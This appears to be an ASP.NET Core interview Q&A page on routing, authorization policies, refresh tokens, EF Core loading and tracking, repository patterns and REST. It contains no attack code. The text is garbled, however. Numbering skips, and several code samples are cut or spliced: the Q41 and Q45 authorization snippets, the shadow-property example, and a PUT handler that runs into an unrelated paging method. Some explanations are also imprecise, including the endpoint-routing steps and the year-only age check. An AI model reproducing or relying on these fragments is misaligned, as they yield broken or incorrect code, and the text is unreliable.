- Good for MVC views (consistent URL structure)

app.MapControllerRoute(
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");

// URL: /Product/Details/5 ? ProductController.Details(5)
// URL: /Home/Index ? HomeController.Index()

ATTRIBUTE ROUTING:
- Defined on Controller/Action using attributes
- More control over URL structure
- Recommended for Web APIs

[Route("api/[controller]")]
public class ProductsController : ControllerBase
{
    [HttpGet]                        // GET /api/products
    public IActionResult GetAll() { }
    
    [HttpGet("{id}")]                // GET /api/products/5
    public IActionResult GetById(int id) { }
    
    [HttpGet("search/{keyword}")]    // GET /api/products/search/phone
    public IActionResult Search(string keyword) { }
    
    [HttpPost]                       // POST /api/products
    public IActionResult Create(ProductDto dto) { }
}

Key Differences:
| Feature          | Conventional           | Attribute              |
|------------------|------------------------|------------------------|
| Defined in       | Program.cs (central)   | Controller/Action      |
| Flexibility      | Less flexible          | Very flexible          |
| Best for         | MVC Views              | Web APIs               |
| URL control      | Pattern-based          | Explicit per action    |
| Discoverability  | Must check Program.cs  | Visible on action      |

Can use BOTH together:
app.MapControllerRoute(...);  // For MVC controllers
app.MapControllers();         // For attribute-routed controllers
32 Q32. How does endpoint routing work in ASP.NET Core? ▼ 
Endpoint Routing separates route MATCHING from route EXECUTION into two steps.

Step 1 - UseRouting(): Matches URL to an endpoint
Step 2 - MapControllerRoute(): Executes the matched endpoint

Endpoint types:
- Controller actions
- Razor Pages
- Minimal APIs
- SignalR hubs
- gRPC services
- Health checks
33 Q33. What are Route Constraints? ▼ 
Route Constraints restrict which values are valid for a route parameter.
If constraint fails, the route doesn't match (404).

Common constraints:
[HttpGet("{id:int}")]              // Only integers
[HttpGet("{name:alpha}")]          // Only alphabetic
[HttpGet("{id:min(1)}")]           // Minimum value 1
[HttpGet("{id:max(100)}")]         // Maximum value 100
[HttpGet("{id:range(1,100)}")]     // Between 1 and 100
[HttpGet("{name:minlength(3)}")]   // Min 3 characters
[HttpGet("{name:maxlength(50)}")]  // Max 50 characters
[HttpGet("{name:length(5)}")]      // Exactly 5 characters
[HttpGet("{id:guid}")]             // Must be GUID
[HttpGet("{date:datetime}")]       // Must be DateTime
[HttpGet("{flag:bool}")]           // Must be boolean
[HttpGet("{value:decimal}")]       // Must be decimal
[HttpGet("{value:double}")]        // Must be double
[HttpGet("{value:float}")]         // Must be float
[HttpGet("{value:long}")]          // Must be long
[HttpGet("{name:regex(^[a-z]+$)}")] // Custom regex

Multiple constraints:
[HttpGet("{id:int:min(1):max(1000)}")]
// Must be int AND >= 1 AND <= 1000

In conventional routing:
app.MapControllerRoute(
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id:int?}");

Custom constraint:
public class EvenNumberConstraint : IRouteConstraint
{
    public bool Match(HttpContext httpContext, IRouter route, string routeKey,
        RouteValueDictionary values, RouteDirection routeDirection)
    {
        if (values.TryGetValue(routeKey, out var value) && int.TryParse(value?.ToString(), out int num))
            return num % 2 == 0;
        return false;
    }
}

// Register
builder.Services.AddRouting(options =>
    options.ConstraintMap.Add("even", typeof(EvenNumberConstraint)));

// Usage: [HttpGet("{id:even}")]
34 Q34. What is the difference between [Route] and [HttpGet]? ▼ 
[Route]:
- Defines URL template only
- Does NOT restrict HTTP method
- Accepts ALL HTTP methods (GET, POST, PUT, DELETE, etc.)
- Used on Controller class for prefix

[HttpGet], [HttpPost], etc.:
- Defines URL template AND restricts HTTP method
- Only matches specific HTTP method
- Used on Action methods

Example:
[Route("api/products")]
public class ProductsController : ControllerBase
{
    [Route("")]           // GET/POST/PUT/DELETE /api/products (any method!)
    public IActionResult All() { }
    
    [HttpGet]             // ONLY GET /api/products
    public IActionResult GetAll() { }
    
    [HttpGet("{id}")]     // ONLY GET /api/products/5
    public IActionResult GetById(int id) { }
    
    [HttpPost]            // ONLY POST /api/products
    public IActionResult Create(ProductDto dto) { }
    
    [Route("{id}/reviews")]  // Any method: /api/products/5/reviews
    public IActionResult Reviews(int id) { }
}

Best practice:
- Use [Route] on Controller for base path prefix
- Use [HttpGet], [HttpPost], etc. on Actions for method-specific routes
- Avoid [Route] on actions in APIs (use HTTP method attributes instead)

39 Q39. What is route precedence? ▼ 
When multiple routes can match a URL, ASP.NET Core uses precedence rules 
to determine which route wins.

Precedence rules (highest to lowest):
1. Literal segments: /products/featured > /products/{id}
2. Constrained parameters: {id:int} > {id}
3. Parameters: {id} > {*catchall}
4. Catch-all: {*path} (lowest priority)

Example:
[HttpGet("products/featured")]     // 1st priority (literal)
[HttpGet("products/{id:int}")]     // 2nd priority (constrained)
[HttpGet("products/{name}")]       // 3rd priority (parameter)
[HttpGet("products/{*path}")]      // 4th priority (catch-all)

URL: /products/featured ? matches literal "featured"
URL: /products/5 ? matches {id:int}
URL: /products/phone ? matches {name}
URL: /products/a/b/c ? matches {*path}

For conventional routes, FIRST defined wins:
app.MapControllerRoute("blog", "blog/{slug}", ...);    // Checked first
app.MapControllerRoute("default", "{controller}/{action}/{id?}", ...); // Checked second

Best practice: Define more specific routes BEFORE general routes.
40 Q40. How to handle route conflicts? ▼ 
Route conflicts occur when multiple actions match the same URL.

Problem:
[HttpGet("{id}")]
public IActionResult GetById(int id) { }

[HttpGet("{name}")]
public IActionResult GetByName(string name) { }
// Both match /products/5 � CONFLICT!

Solutions:

1. Use route constraints:
[HttpGet("{id:int}")]           // /products/5 ? matches (int)
public IActionResult GetById(int id) { }

[HttpGet("{name:alpha}")]       // /products/phone ? matches (alpha)
public IActionResult GetByName(string name) { }

2. Use different URL patterns:
[HttpGet("{id:int}")]           // /products/5
public IActionResult GetById(int id) { }

[HttpGet("by-name/{name}")]    // /products/by-name/phone
public IActionResult GetByName(string name) { }

3. Use [Route] with order:
[HttpGet("{id}", Order = 1)]
public IActionResult GetById(int id) { }

[HttpGet("{name}", Order = 2)]
public IActionResult GetByName(string name) { }

4. Single action with logic:
[HttpGet("{identifier}")]
public IActionResult Get(string identifier)
{
    if (int.TryParse(identifier, out int id))
        return GetById(id);
    return GetByName(identifier);
}

If conflict is not resolved, ASP.NET Core throws:
AmbiguousMatchException: The request matched multiple endpoints

41 Q41. What is the difference between Authentication and Authorization? ▼ 
AUTHENTICATION (Who are you?):
- Verifying the IDENTITY of a user
- Proves the user is who they claim to be
- Happens FIRST
- Methods: Username/password, JWT token, Cookie, OAuth
- Result: User identity (ClaimsPrincipal)
- 401 Unauthorized if fails

AUTHORIZATION (What can you do?):
- Verifying the PERMISSIONS of an authenticated user
- Determines what resources user can access
- Happens AFTER authentication
- Methods: Roles, Claims, Policies
- Result: Allow or deny access
- 403 Forbidden if fails

Analogy:
- Authentication = Showing your ID at the door (proving identity)
- Authorization = Checking if your ID allows VIP access (checking permissions)

In ASP.NET Core:
app.UseAuthentication();   // Sets HttpContext.User (identity)
app.UseAuthorization();    // Checks if User can access endpoint

[Authorize(Policy = "MinAge18")]      // Must satisfy policy

        var claims = new[]
        {

            new Claim(ClaimTypes.Email, user.Email),
            new Claim(ClaimTypes.Role, user.Role)

    }
}

45 Q45. What is Role-based vs Policy-based Authorization? ▼ 
ROLE-BASED (simple, limited):
- Check if user belongs to a role
- Hardcoded role names in attributes
- Less flexible

- Reusable and testable

{

    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin"));
    
    // Multiple requirements (AND)
    options.AddPolicy("SeniorAdmin", policy =>
    {
        policy.RequireRole("Admin");
        policy.RequireClaim("Level", "Senior");
        policy.RequireAuthenticatedUser();
    });

        policy.Requirements.Add(new MinAgeRequirement(18)));
    
    // Assertion-based
    options.AddPolicy("BusinessHours", policy =>
        policy.RequireAssertion(context =>
        {
            var hour = DateTime.Now.Hour;
            return hour >= 9 && hour <= 17;
        }));
});

[Authorize(Policy = "SeniorAdmin")]

- Centralized authorization logic
- Easy to change rules without modifying controllers
- Supports complex scenarios (time-based, resource-based)
- Testable
- Separation of concerns

    public MinAgeRequirement(int minimumAge)
    {
        MinimumAge = minimumAge;
    }
}

Step 2: Create a Handler
public class MinAgeHandler : AuthorizationHandler<MinAgeRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        MinAgeRequirement requirement)
    {
        var dateOfBirthClaim = context.User.FindFirst("DateOfBirth");
        
        if (dateOfBirthClaim == null)
        {
            return Task.CompletedTask;  // Requirement not met (no claim)
        }
        
        var dateOfBirth = DateTime.Parse(dateOfBirthClaim.Value);
        var age = DateTime.Today.Year - dateOfBirth.Year;
        
        if (age >= requirement.MinimumAge)
        {
            context.Succeed(requirement);  // Requirement met!
        }
        
        return Task.CompletedTask;
    }
}

builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("MinAge18", policy =>
        policy.Requirements.Add(new MinAgeRequirement(18)));

        policy.Requirements.Add(new MinAgeRequirement(21)));
});

48 Q48. What is IAuthorizationHandler? ▼ 
IAuthorizationHandler is the interface that evaluates authorization requirements.
It contains the logic to determine if a requirement is satisfied.

Interface:
public interface IAuthorizationHandler
{
    Task HandleAsync(AuthorizationHandlerContext context);
}

Typed version (most common):
public abstract class AuthorizationHandler<TRequirement> : IAuthorizationHandler
    where TRequirement : IAuthorizationRequirement
{
    protected abstract Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        TRequirement requirement);
}

Multiple handlers for same requirement:
// Handler 1: Owner can always access
public class DocumentOwnerHandler : AuthorizationHandler<EditDocumentRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context, EditDocumentRequirement requirement)
    {
        var document = (Document)context.Resource;
        if (document.OwnerId == context.User.FindFirst("UserId")?.Value)
            context.Succeed(requirement);
        return Task.CompletedTask;
    }
}

// Handler 2: Admin can always access
public class AdminHandler : AuthorizationHandler<EditDocumentRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context, EditDocumentRequirement requirement)
    {
        if (context.User.IsInRole("Admin"))
            context.Succeed(requirement);
        return Task.CompletedTask;
    }
}

// Register both
builder.Services.AddSingleton<IAuthorizationHandler, DocumentOwnerHandler>();
builder.Services.AddSingleton<IAuthorizationHandler, AdminHandler>();

// Either handler succeeding = authorized (OR logic)

Key methods:
- context.Succeed(requirement) ? Requirement satisfied
- context.Fail() ? Explicitly deny (overrides other handlers)
- Do nothing ? Requirement not met by this handler

51 Q51. How to implement Refresh Tokens? ▼ 
Refresh tokens allow getting new access tokens without re-authentication.

Flow:
1. User logs in ? receives Access Token (short-lived) + Refresh Token (long-lived)
2. Access Token expires (e.g., 15 min)
3. Client sends Refresh Token to get new Access Token
4. Server validates Refresh Token, issues new pair

Implementation:

Model:
public class RefreshToken
{
    public int Id { get; set; }
    public string Token { get; set; }
    public string UserId { get; set; }
    public DateTime Expires { get; set; }
    public DateTime Created { get; set; }
    public bool IsRevoked { get; set; }
    public bool IsExpired => DateTime.UtcNow >= Expires;
    public bool IsActive => !IsRevoked && !IsExpired;
}

Login endpoint (returns both tokens):
[HttpPost("login")]
public async Task<IActionResult> Login(LoginDto dto)
{
    var user = await _userService.ValidateAsync(dto.Email, dto.Password);
    if (user == null) return Unauthorized();
    
    var accessToken = _tokenService.GenerateAccessToken(user);  // 15 min
    var refreshToken = _tokenService.GenerateRefreshToken();     // 7 days
    
    // Save refresh token to database
    user.RefreshTokens.Add(new RefreshToken
    {
        Token = refreshToken,
        Expires = DateTime.UtcNow.AddDays(7),
        Created = DateTime.UtcNow
    });
    await _context.SaveChangesAsync();
    
    return Ok(new
    {
        AccessToken = accessToken,
        RefreshToken = refreshToken,
        ExpiresIn = 900  // 15 minutes in seconds
    });
}

Refresh endpoint:
[HttpPost("refresh")]
public async Task<IActionResult> Refresh(RefreshRequest request)
{
    var principal = _tokenService.GetPrincipalFromExpiredToken(request.AccessToken);
    var userId = principal.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    
    var user = await _context.Users
        .Include(u => u.RefreshTokens)
        .FirstOrDefaultAsync(u => u.Id == userId);
    
    var storedToken = user?.RefreshTokens
        .FirstOrDefault(t => t.Token == request.RefreshToken);
    
    if (storedToken == null || !storedToken.IsActive)
        return Unauthorized("Invalid refresh token");
    
    // Revoke old refresh token
    storedToken.IsRevoked = true;
    
    // Generate new tokens
    var newAccessToken = _tokenService.GenerateAccessToken(user);
    var newRefreshToken = _tokenService.GenerateRefreshToken();
    
    user.RefreshTokens.Add(new RefreshToken
    {
        Token = newRefreshToken,
        Expires = DateTime.UtcNow.AddDays(7),
        Created = DateTime.UtcNow
    });
    
    await _context.SaveChangesAsync();
    
    return Ok(new
    {
        AccessToken = newAccessToken,
        RefreshToken = newRefreshToken
    });
}

56 Q56. What is Lazy Loading vs Eager Loading vs Explicit Loading? ▼ 
EAGER LOADING (Include - loads related data immediately):
- Uses .Include() and .ThenInclude()
- Single query with JOINs
- Best when you KNOW you need related data

var employees = await _context.Employees
    .Include(e => e.Department)           // Load department
    .Include(e => e.Orders)               // Load orders
        .ThenInclude(o => o.OrderItems)   // Load order items
    .ToListAsync();

// SQL: SELECT * FROM Employees 
//      JOIN Departments ON ... 
//      JOIN Orders ON ...
//      JOIN OrderItems ON ...

LAZY LOADING (loads related data on first access):
- Related data loaded automatically when property is accessed
- Requires virtual navigation properties
- Multiple queries (N+1 problem risk)
- Must install Microsoft.EntityFrameworkCore.Proxies

// Setup
builder.Services.AddDbContext<AppDbContext>(options =>
    options.UseLazyLoadingProxies().UseSqlServer(connStr));

public class Employee
{
    public int Id { get; set; }
    public string Name { get; set; }
    public virtual Department Department { get; set; }  // virtual = lazy loaded
    public virtual ICollection<Order> Orders { get; set; }
}

// Usage - triggers separate query when accessed
var emp = await _context.Employees.FindAsync(1);
var deptName = emp.Department.Name;  // Triggers: SELECT * FROM Departments WHERE Id=...

EXPLICIT LOADING (load on demand manually):
- You decide WHEN to load related data
- Uses .Entry().Reference() or .Entry().Collection()

var employee = await _context.Employees.FindAsync(1);

// Load single reference
await _context.Entry(employee)
    .Reference(e => e.Department)
    .LoadAsync();

// Load collection
await _context.Entry(employee)
    .Collection(e => e.Orders)
    .LoadAsync();

Comparison:
| Feature        | Eager           | Lazy            | Explicit        |
|----------------|-----------------|-----------------|-----------------|
| When loaded    | Immediately     | On access       | On demand       |
| Queries        | 1 (with JOINs)  | N+1 (multiple)  | As needed       |
| Performance    | Best for known  | Risk of N+1     | Controlled      |
| Setup          | .Include()      | virtual + proxy | .Entry().Load() |
| Best for       | Known relations | Simple cases    | Conditional     |
57 Q57. What is the difference between Include() and ThenInclude()? ▼ 
Include():
- Loads a DIRECT navigation property of the main entity
- First level of related data

ThenInclude():
- Loads a navigation property of the INCLUDED entity
- Second, third, etc. levels (nested)

Example:
// Entity relationships:
// Order ? OrderItems ? Product ? Category

var orders = await _context.Orders
    .Include(o => o.Customer)              // Direct: Order.Customer
    .Include(o => o.OrderItems)            // Direct: Order.OrderItems
        .ThenInclude(oi => oi.Product)     // Nested: OrderItem.Product
            .ThenInclude(p => p.Category)  // Deeper: Product.Category
    .Include(o => o.ShippingAddress)       // Direct: Order.ShippingAddress
    .ToListAsync();

// Multiple Include chains:
var employees = await _context.Employees
    .Include(e => e.Department)            // Employee ? Department
    .Include(e => e.Manager)               // Employee ? Manager
    .Include(e => e.Projects)              // Employee ? Projects
        .ThenInclude(p => p.Tasks)         // Project ? Tasks
            .ThenInclude(t => t.Assignee)  // Task ? Assignee
    .ToListAsync();

Filtered Include (.NET 5+):
var departments = await _context.Departments
    .Include(d => d.Employees.Where(e => e.IsActive))  // Only active employees
    .ToListAsync();

Important: Each .Include() starts from the ROOT entity.
ThenInclude() continues from the LAST included entity.
58 Q58. What is Change Tracking? ▼ 
Change Tracking is EF Core's mechanism to detect what changes have been made 
to entities so it can generate appropriate SQL (INSERT, UPDATE, DELETE).

Entity States:
- Added: New entity, will be INSERTed
- Modified: Existing entity changed, will be UPDATEd
- Deleted: Marked for deletion, will be DELETEd
- Unchanged: No changes detected
- Detached: Not tracked by context

How it works:
var employee = await _context.Employees.FindAsync(1);  // State: Unchanged
employee.Name = "New Name";                             // State: Modified
_context.Employees.Remove(employee);                    // State: Deleted

var newEmp = new Employee { Name = "John" };
_context.Employees.Add(newEmp);                         // State: Added

await _context.SaveChangesAsync();
// EF generates: UPDATE Employees SET Name='New Name' WHERE Id=1
//               DELETE FROM Employees WHERE Id=1
//               INSERT INTO Employees (Name) VALUES ('John')

Check entity state:
var entry = _context.Entry(employee);
Console.WriteLine(entry.State);  // Modified

// See what changed
foreach (var prop in entry.Properties.Where(p => p.IsModified))
{
    Console.WriteLine($"{prop.Metadata.Name}: {prop.OriginalValue} ? {prop.CurrentValue}");
}

Disable tracking for read-only queries:
var employees = await _context.Employees
    .AsNoTracking()  // No change tracking = faster reads
    .ToListAsync();
59 Q59. How to handle concurrency conflicts? ▼ 
Concurrency conflict: Two users edit the same record simultaneously.

Optimistic Concurrency (default approach):
- Allow multiple users to read
- Check for conflicts on save
- Use a concurrency token (RowVersion/Timestamp)

Step 1: Add concurrency token to entity
public class Product
{
    public int Id { get; set; }
    public string Name { get; set; }
    public decimal Price { get; set; }
    
    [Timestamp]  // SQL Server rowversion
    public byte[] RowVersion { get; set; }
}

// Or Fluent API:
modelBuilder.Entity<Product>()
    .Property(p => p.RowVersion)
    .IsRowVersion();

Step 2: Handle DbUpdateConcurrencyException
[HttpPost]
public async Task<IActionResult> Edit(ProductViewModel model)
{
    var product = await _context.Products.FindAsync(model.Id);
    
    product.Name = model.Name;
    product.Price = model.Price;
    _context.Entry(product).OriginalValues["RowVersion"] = model.RowVersion;
    
    try
    {
        await _context.SaveChangesAsync();
        return RedirectToAction("Index");
    }
    catch (DbUpdateConcurrencyException ex)
    {
        var entry = ex.Entries.Single();
        var databaseValues = await entry.GetDatabaseValuesAsync();
        
        if (databaseValues == null)
        {
            ModelState.AddModelError("", "Record was deleted by another user.");
        }
        else
        {
            var dbProduct = (Product)databaseValues.ToObject();
            ModelState.AddModelError("", "Record was modified by another user.");
            ModelState.AddModelError("", $"Current DB value - Name: {dbProduct.Name}");
            
            // Update RowVersion to current DB value for retry
            model.RowVersion = dbProduct.RowVersion;
        }
        
        return View(model);
    }
}

What happens:
- User A reads product (RowVersion = 0x001)
- User B reads product (RowVersion = 0x001)
- User A saves ? Success (RowVersion becomes 0x002)
- User B saves ? DbUpdateConcurrencyException (RowVersion 0x001 ? 0x002)
60 Q60. What is AsNoTracking() and when to use it? ▼ 
AsNoTracking() tells EF Core NOT to track the returned entities in the 
Change Tracker. This improves performance for read-only operations.

With tracking (default):
var employees = await _context.Employees.ToListAsync();
// EF tracks all entities, detects changes, uses more memory

Without tracking:
var employees = await _context.Employees.AsNoTracking().ToListAsync();
// EF does NOT track, faster, less memory

When to use AsNoTracking():
- Read-only queries (displaying data in views)
- Reports and dashboards
- Search results
- Any query where you won't modify the data
- API GET endpoints

When NOT to use:
- When you plan to update/delete the entities
- When you need change tracking for SaveChanges()

Performance difference:
// Reading 10,000 records:
// With tracking: ~150ms, more memory
// Without tracking: ~80ms, less memory (roughly 2x faster)

AsNoTrackingWithIdentityResolution():
// Prevents duplicate entities in result (maintains identity map)
var orders = await _context.Orders
    .Include(o => o.Customer)
    .AsNoTrackingWithIdentityResolution()  // Same customer object reused
    .ToListAsync();

Global no-tracking:
// Set default for all queries on a context
_context.ChangeTracker.QueryTrackingBehavior = QueryTrackingBehavior.NoTracking;

Best practice:
- Use AsNoTracking() for all read operations
- Only use tracking when you need to update/delete
61 Q61. What are Shadow Properties? ▼ 
Shadow Properties are properties that exist in the EF Core model but NOT in 
the .NET entity class. They exist only in the database and Change Tracker.

Use cases:
- Audit fields (CreatedDate, ModifiedDate, CreatedBy)
- Foreign keys you don't want in the entity class
- Database-only columns

Define shadow properties (Fluent API):
protected override void OnModelCreating(ModelBuilder modelBuilder)
{

        .Property<DateTime>("CreatedDate");
    
    modelBuilder.Entity<Product>()
        .Property<DateTime>("ModifiedDate");
    
    modelBuilder.Entity<Product>()
        .Property<string>("CreatedBy");
}

Set shadow property values:
var product = new Product { Name = "Phone", Price = 999 };
_context.Products.Add(product);

_context.Entry(product).Property("CreatedDate").CurrentValue = DateTime.UtcNow;

Auto-set in SaveChanges override:
public override async Task<int> SaveChangesAsync(CancellationToken cancellationToken = default)
{
    foreach (var entry in ChangeTracker.Entries())
    {
        if (entry.State == EntityState.Added)
        {
            entry.Property("CreatedDate").CurrentValue = DateTime.UtcNow;
        }
        if (entry.State == EntityState.Modified)
        {
            entry.Property("ModifiedDate").CurrentValue = DateTime.UtcNow;
        }
    }
    return await base.SaveChangesAsync(cancellationToken);
}

var recentProducts = await _context.Products

63 Q63. What is the Repository Pattern with EF Core? ▼ 
Repository Pattern abstracts data access logic, providing a clean interface 
between business logic and data layer.

Generic Repository Interface:
public interface IRepository<T> where T : class
{
    Task<T> GetByIdAsync(int id);
    Task<IEnumerable<T>> GetAllAsync();
    Task<IEnumerable<T>> FindAsync(Expression<Func<T, bool>> predicate);
    Task AddAsync(T entity);
    void Update(T entity);
    void Delete(T entity);
    Task<int> SaveChangesAsync();
}

Generic Repository Implementation:
public class Repository<T> : IRepository<T> where T : class
{
    protected readonly AppDbContext _context;
    protected readonly DbSet<T> _dbSet;
    
    public Repository(AppDbContext context)
    {
        _context = context;
        _dbSet = context.Set<T>();
    }
    
    public async Task<T> GetByIdAsync(int id)
        => await _dbSet.FindAsync(id);
    
    public async Task<IEnumerable<T>> GetAllAsync()
        => await _dbSet.ToListAsync();
    
    public async Task<IEnumerable<T>> FindAsync(Expression<Func<T, bool>> predicate)
        => await _dbSet.Where(predicate).ToListAsync();
    
    public async Task AddAsync(T entity)
        => await _dbSet.AddAsync(entity);
    
    public void Update(T entity)
        => _dbSet.Update(entity);
    
    public void Delete(T entity)
        => _dbSet.Remove(entity);
    
    public async Task<int> SaveChangesAsync()
        => await _context.SaveChangesAsync();
}

Specific Repository:
public interface IProductRepository : IRepository<Product>
{
    Task<IEnumerable<Product>> GetByCategoryAsync(int categoryId);
    Task<IEnumerable<Product>> GetTopSellingAsync(int count);
}

public class ProductRepository : Repository<Product>, IProductRepository
{
    public ProductRepository(AppDbContext context) : base(context) { }
    
    public async Task<IEnumerable<Product>> GetByCategoryAsync(int categoryId)
        => await _dbSet.Where(p => p.CategoryId == categoryId)
                       .Include(p => p.Category)
                       .ToListAsync();
    
    public async Task<IEnumerable<Product>> GetTopSellingAsync(int count)
        => await _dbSet.OrderByDescending(p => p.SalesCount)
                       .Take(count)
                       .ToListAsync();
}

64 Q64. What is Unit of Work pattern? ▼ 
Unit of Work maintains a list of objects affected by a business transaction 
and coordinates writing out changes in a single transaction.

Why: When multiple repositories need to save as ONE atomic operation.

Interface:
public interface IUnitOfWork : IDisposable
{
    IProductRepository Products { get; }
    IOrderRepository Orders { get; }
    ICustomerRepository Customers { get; }
    Task<int> SaveChangesAsync();
}

Implementation:
public class UnitOfWork : IUnitOfWork
{
    private readonly AppDbContext _context;
    
    public UnitOfWork(AppDbContext context)
    {
        _context = context;
        Products = new ProductRepository(_context);
        Orders = new OrderRepository(_context);
        Customers = new CustomerRepository(_context);
    }
    
    public IProductRepository Products { get; }
    public IOrderRepository Orders { get; }
    public ICustomerRepository Customers { get; }
    
    public async Task<int> SaveChangesAsync()
    {
        return await _context.SaveChangesAsync();
    }
    
    public void Dispose()
    {
        _context.Dispose();
    }
}

Usage in Service:
public class OrderService
{
    private readonly IUnitOfWork _unitOfWork;
    
    public OrderService(IUnitOfWork unitOfWork)
    {
        _unitOfWork = unitOfWork;
    }
    
    public async Task PlaceOrderAsync(OrderDto dto)
    {
        // Multiple operations in ONE transaction
        var order = new Order { CustomerId = dto.CustomerId, Date = DateTime.UtcNow };
        await _unitOfWork.Orders.AddAsync(order);
        
        foreach (var item in dto.Items)
        {
            var product = await _unitOfWork.Products.GetByIdAsync(item.ProductId);
            product.Stock -= item.Quantity;
            _unitOfWork.Products.Update(product);
        }
        
        // Single SaveChanges = single transaction
        await _unitOfWork.SaveChangesAsync();
        // If any operation fails, ALL are rolled back
    }
}

Registration:
builder.Services.AddScoped<IUnitOfWork, UnitOfWork>();

Note: Some argue DbContext IS already a Unit of Work + Repository.
The pattern adds value for complex applications with multiple bounded contexts.

66 Q66. What is REST and RESTful API design principles? ▼ 
REST (Representational State Transfer) is an architectural style for 
designing networked applications.

RESTful Principles:
1. Client-Server: Separation of concerns
2. Stateless: Each request contains all info needed (no server session)
3. Cacheable: Responses can be cached
4. Uniform Interface: Consistent URL patterns and HTTP methods
5. Layered System: Client doesn't know if connected directly to server
6. Resource-based: Everything is a resource with a unique URI

RESTful URL Design:
GET    /api/products          ? Get all products
GET    /api/products/5        ? Get product by ID
POST   /api/products          ? Create new product
PUT    /api/products/5        ? Update entire product
PATCH  /api/products/5        ? Partial update
DELETE /api/products/5        ? Delete product

GET    /api/products/5/reviews     ? Get reviews for product 5
POST   /api/products/5/reviews     ? Add review to product 5

Best practices:
- Use nouns (not verbs): /api/products NOT /api/getProducts
- Use plural: /api/products NOT /api/product
- Use HTTP methods for actions
- Use proper status codes
- Version your API: /api/v1/products
- Use query params for filtering: /api/products?category=electronics&sort=price
67 Q67. What are HTTP methods (GET, POST, PUT, PATCH, DELETE)? ▼ 
GET:
- Retrieve resource(s)
- Idempotent (same result every time)
- Safe (no side effects)
- Cacheable
- No request body
- Response: 200 OK with data

POST:
- Create new resource
- NOT idempotent (creates new each time)
- Not safe
- Request body contains new resource data
- Response: 201 Created with location header

PUT:
- Replace entire resource
- Idempotent
- Request body contains complete updated resource
- Response: 200 OK or 204 No Content

PATCH:
- Partial update of resource
- May or may not be idempotent
- Request body contains only changed fields
- Response: 200 OK or 204 No Content

DELETE:
- Remove resource
- Idempotent
- Usually no request body
- Response: 204 No Content or 200 OK

HEAD:
- Same as GET but returns only headers (no body)
- Used to check if resource exists

OPTIONS:
- Returns allowed HTTP methods for a resource
- Used in CORS preflight requests

Status codes:
200 OK - Success
201 Created - Resource created
204 No Content - Success, no body
400 Bad Request - Invalid input
401 Unauthorized - Not authenticated
403 Forbidden - Not authorized
404 Not Found - Resource doesn't exist
409 Conflict - Conflict (duplicate)
422 Unprocessable Entity - Validation failed
500 Internal Server Error - Server error
68 Q68. What is the difference between PUT and PATCH? ▼ 
PUT (Full replacement):
- Sends the COMPLETE resource
- All fields must be included
- Missing fields are set to null/default
- Idempotent

// PUT /api/products/5
// Request body (COMPLETE object):
{
    "id": 5,
    "name": "iPhone 15",
    "price": 999,
    "description": "Latest iPhone",
    "categoryId": 1,
    "stock": 50,
    "isActive": true
}
// ALL fields replaced, even unchanged ones

PATCH (Partial update):
- Sends ONLY the changed fields
- Other fields remain unchanged
- More efficient for small changes

// PATCH /api/products/5
// Request body (ONLY changed fields):
{
    "price": 899
}
// Only price changes, everything else stays the same

Implementation:
[HttpPut("{id}")]
public async Task<IActionResult> Put(int id, [FromBody] UpdateProductDto dto)
{
    var product = await _context.Products.FindAsync(id);
    if (product == null) return NotFound();
    
    // Replace ALL fields
    product.Name = dto.Name;
    product.Price = dto.Price;
    product.Description = dto.Description;
    product.CategoryId = dto.CategoryId;
    product.Stock = dto.Stock;
    product.IsActive = dto.IsActive;
    
    await _context.SaveChangesAsync();
    return NoContent();

[HttpGet]
public async Task<ActionResult<PagedResponse<ProductDto>>> GetAll(
    [FromQuery] ProductQueryParameters query)
{
    var productsQuery = _context.Products.AsQueryable();
    
    // Filtering
    if (!string.IsNullOrEmpty(query.Search))
        productsQuery = productsQuery.Where(p => p.Name.Contains(query.Search));
    
    if (!string.IsNullOrEmpty(query.Category))
        productsQuery = productsQuery.Where(p => p.Category.Name == query.Category);
    
    if (query.MinPrice.HasValue)
        productsQuery = productsQuery.Where(p => p.Price >= query.MinPrice);
    
    if (query.MaxPrice.HasValue)
        productsQuery = productsQuery.Where(p => p.Price <= query.MaxPrice);
    
    // Sorting
    productsQuery = query.SortBy?.ToLower() switch
    {
        "price" => query.SortOrder == "desc" 
            ? productsQuery.OrderByDescending(p => p.Price)
            : productsQuery.OrderBy(p => p.Price),
        "name" => query.SortOrder == "desc"
            ? productsQuery.OrderByDescending(p => p.Name)
            : productsQuery.OrderBy(p => p.Name),
        _ => productsQuery.OrderBy(p => p.Name)
    };
    
    // Pagination
    var totalRecords = await productsQuery.CountAsync();
    var products = await productsQuery
        .Skip((query.PageNumber - 1) * query.PageSize)
        .Take(query.PageSize)
        .Select(p => new ProductDto { Id = p.Id, Name = p.Name, Price = p.Price })
        .ToListAsync();
    
    return Ok(new PagedResponse<ProductDto>
    {
        Data = products,
        PageNumber = query.PageNumber,
        PageSize = query.PageSize,
        TotalRecords = totalRecords,
        TotalPages = (int)Math.Ceiling(totalRecords / (double)query.PageSize)
    });
}

- Lost on app restart
- Not shared across servers

78 Q78. What is connection pooling? ▼ 
Connection pooling reuses database connections instead of creating new ones 
for each request. Managed automatically by ADO.NET/EF Core.

How it works:
1. First request: Connection created and used
2. Request completes: Connection returned to POOL (not closed)
3. Next request: Reuses connection from pool (no creation overhead)
4. Pool grows/shrinks based on demand

Connection string settings:
"Server=.;Database=MyDb;Trusted_Connection=true;
 Min Pool Size=5;
 Max Pool Size=100;
 Connection Timeout=30;
 Pooling=true;"

EF Core and connection pooling:
// DbContext pooling (reuses DbContext instances too)
builder.Services.AddDbContextPool<AppDbContext>(options =>
    options.UseSqlServer(connectionString), poolSize: 128);

// vs regular (creates new DbContext each time)
builder.Services.AddDbContext<AppDbContext>(options =>
    options.UseSqlServer(connectionString));

Benefits of DbContextPool:
- Reuses DbContext instances (less GC pressure)
- Reuses database connections
- Better performance under high load
- Default pool size: 1024

Best practices:
- Always dispose DbContext (scoped lifetime handles this)
- Don't hold connections longer than needed
- Use async methods (releases connection while waiting)
- Monitor pool exhaustion in production

public class GlobalExceptionMiddleware
{
    private readonly RequestDelegate _next;
